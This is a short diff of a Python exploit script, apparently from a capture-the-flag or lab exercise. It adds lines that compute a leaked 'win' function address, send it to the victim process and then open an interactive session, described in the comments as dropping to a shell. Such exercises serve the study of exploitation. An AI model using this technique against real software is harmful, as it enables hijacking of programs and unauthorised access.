@@ -27,4 +27,13 @@ if __name__ == "__main__":
     base_address_as_dec = int(base_address_as_hex, 16)
     win_address_as_dec = base_address_as_dec + 5130
 
+    # I convert the address to a string and encode it as bytes.
+    win_address_in_bytes = str(win_address_as_dec).encode()
+
+    # I send the address back to the victim process.
+    process_to_exploit.sendline(win_address_in_bytes)
+
+    # I drop to a shell.
+    process_to_exploit.interactive()
+
     print("I am a breakpoint placeholder to help with debugging")
